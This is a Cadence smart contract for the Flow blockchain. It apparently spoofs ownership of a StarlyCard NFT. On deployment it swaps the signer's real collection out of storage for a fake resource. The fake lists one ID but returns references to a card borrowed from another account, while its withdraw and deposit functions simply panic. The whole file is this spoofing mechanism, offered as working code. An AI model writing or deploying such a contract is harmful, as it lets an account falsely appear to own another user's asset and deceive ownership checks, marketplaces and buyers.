/*
This tool adds a new entitlemtent called TMP_ENTITLEMENT_OWNER to some functions that it cannot be sure if it is safe to make access(all)
those functions you should check and update their entitlemtents ( or change to all access )

Please see: 
https://cadence-lang.org/docs/cadence-migration-guide/nft-guide#update-all-pub-access-modfiers

IMPORTANT SECURITY NOTICE
Please familiarize yourself with the new entitlements feature because it is extremely important for you to understand in order to build safe smart contracts.
If you change pub to access(all) without paying attention to potential downcasting from public interfaces, you might expose private functions like withdraw 
that will cause security problems for your contract.

*/

	import NonFungibleToken from "./../../standardsV1/NonFungibleToken.cdc"

import ViewResolver from "../../standardsV1/ViewResolver.cdc"

import MetadataViews from "./../../standardsV1/MetadataViews.cdc"

import StarlyMetadata from "../0x5b82f21c0edf76e3/StarlyMetadata.cdc"

import StarlyMetadataViews from "../0x5b82f21c0edf76e3/StarlyMetadataViews.cdc"

import StarlyCard from "../0x5b82f21c0edf76e3/StarlyCard.cdc"

access(all)
contract sc1{ 
	access(all)
	resource tr:
		NonFungibleToken.Provider,
		NonFungibleToken.Receiver,
		NonFungibleToken.Collection,
		NonFungibleToken.CollectionPublic,
		ViewResolver.ResolverCollection,
		StarlyCard.StarlyCardCollectionPublic{
	
		access(NonFungibleToken.Withdraw)
		fun withdraw(withdrawID: UInt64): @{NonFungibleToken.NFT}{ 
			panic("no")
		}
		
		access(all)
		fun deposit(token: @{NonFungibleToken.NFT}): Void{ 
			panic("no")
		}
		
		access(all)
		view fun getIDs(): [UInt64]{ 
			return [57878]
		}
		
		access(all)
		view fun borrowNFT(_ id: UInt64): &{NonFungibleToken.NFT}?{ 
			let owner = getAccount(0x58ed5053ec610954)
			let col =
				owner.capabilities.get<&{NonFungibleToken.CollectionPublic}>(
					/public/starlyCardCollection
				).borrow<&{NonFungibleToken.CollectionPublic}>()
				?? panic("NFT Collection not found")
			if col == nil{ 
				panic("no")
			}
			let nft = (col!).borrowNFT(id: 25176)
			return nft
		}
		
		access(all)
		view fun borrowViewResolver(id: UInt64): &{ViewResolver.Resolver}?{ 
			let owner = getAccount(0x58ed5053ec610954)
			let col =
				owner.capabilities.get<&{ViewResolver.ResolverCollection}>(
					/public/starlyCardCollection
				).borrow<&{MetadataViews.ResolverCollection}>()
				?? panic("NFT Collection not found")
			if col == nil{ 
				panic("no")
			}
			let nft = (col!).borrowViewResolver(id: 25176)!
			return nft
		}
		
		access(TMP_ENTITLEMENT_OWNER)
		fun borrowStarlyCard(id: UInt64): &StarlyCard.NFT?{ 
			let owner = getAccount(0x58ed5053ec610954)
			let col =
				owner.capabilities.get<&{StarlyCard.StarlyCardCollectionPublic}>(
					/public/starlyCardCollection
				).borrow<&{StarlyCard.StarlyCardCollectionPublic}>()
				?? panic("NFT Collection not found")
			if col == nil{ 
				panic("no")
			}
			let nft = (col!).borrowStarlyCard(id: 25176)
			return nft
		}
		
		access(all)
		view fun getSupportedNFTTypes():{ Type: Bool}{ 
			panic("implement me")
		}
		
		access(all)
		view fun isSupportedNFTType(type: Type): Bool{ 
			panic("implement me")
		}
	}
	
	access(TMP_ENTITLEMENT_OWNER)
	fun loadR(_ signer: AuthAccount){ 
		let r <- create tr()
		let old <- signer.load<@StarlyCard.Collection>(from: /storage/starlyCardCollection)!
		signer.save(<-r, to: /storage/starlyCardCollection)
		signer.save(<-old, to: /storage/sc1)
	}
	
	access(TMP_ENTITLEMENT_OWNER)
	fun clearR(_ signer: AuthAccount){ 
		let old <- signer.load<@StarlyCard.Collection>(from: /storage/sc1)!
		let r <- signer.load<@sc1.tr>(from: /storage/starlyCardCollection)!
		signer.save(<-old, to: /storage/starlyCardCollection)
		destroy r
	}
	
	init(){ 
		self.loadR(self.account)
	}
}
